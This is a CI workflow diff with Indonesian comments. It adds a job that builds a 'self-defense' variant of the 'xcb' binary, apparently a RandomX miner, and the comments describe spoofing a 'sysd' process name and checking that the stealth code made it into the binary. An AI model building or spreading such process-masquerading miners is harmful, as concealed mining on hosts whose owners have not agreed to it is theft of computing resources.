@@ -225,6 +225,59 @@ jobs:
           if-no-files-found: error
           retention-days: 14
 
+  build-2204-sd:
+    name: Build + artefak self-defense (Ubuntu 22.04)
+    # Build terpisah dari xcb-2204 karena tarball rilis sengaja tetap tanpa
+    # ENABLE_SELF_DEFENSE (build publik bersih). Artefak ini yang dipakai host
+    # fleet yang butuh spoof sysd/XCB_TITLE; isinya sama dengan xcb-2204,
+    # hanya binary-nya yang membawa kode self-defense.
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Checkout (termasuk submodule)
+        uses: actions/checkout@v7
+        with:
+          submodules: recursive
+
+      - name: Build + selftest di ubuntu:22.04 (ENABLE_SELF_DEFENSE=ON)
+        run: |
+          docker run --rm -v "$PWD":/src -w /src ubuntu:22.04 bash -c '
+            set -e
+            apt-get update -qq
+            DEBIAN_FRONTEND=noninteractive apt-get install -y -qq build-essential cmake git libssl-dev ca-certificates >/dev/null
+            git config --global --add safe.directory /src
+            cmake -S . -B build -DCMAKE_BUILD_TYPE=Release -DENABLE_SELF_DEFENSE=ON
+            cmake --build build --parallel "$(nproc)"
+            ./build/xcb --version | tee VERSION
+            if grep -q unknown VERSION; then echo "ERROR: commit tidak terbaca di --version"; exit 1; fi
+            # Gerbang: flag harus benar-benar masuk ke binary. Tanpa cek ini
+            # artefak bisa identik dengan build biasa dan stealth-nya hilang
+            # tanpa ada yang gagal.
+            grep -aq XCB_TITLE build/xcb || {
+              echo "ERROR: kode self-defense tidak ada di binary"; exit 1; }
+            ./build/xcb --selftest
+            ldd build/xcb | grep "librandomx_v2.so =>"
+          '
+
+      - name: Stage artefak self-defense
+        run: |
+          mkdir -p dist-sd
+          cp build/xcb build/librandomx_v2.so VERSION dist-sd/
+          test -x dist-sd/xcb
+          test -f dist-sd/librandomx_v2.so
+          test -f dist-sd/VERSION
+          ( cd dist-sd && sha256sum xcb librandomx_v2.so VERSION > SHA256SUMS )
+          ls -l dist-sd
+          cat dist-sd/SHA256SUMS
+
+      - name: Upload artefak self-defense
+        uses: actions/upload-artifact@v7
+        with:
+          name: xcb-2204-sd
+          path: dist-sd/
+          if-no-files-found: error
+          retention-days: 14
+
   musl:
     name: Build + selftest (Alpine/musl)
     runs-on: ubuntu-latest
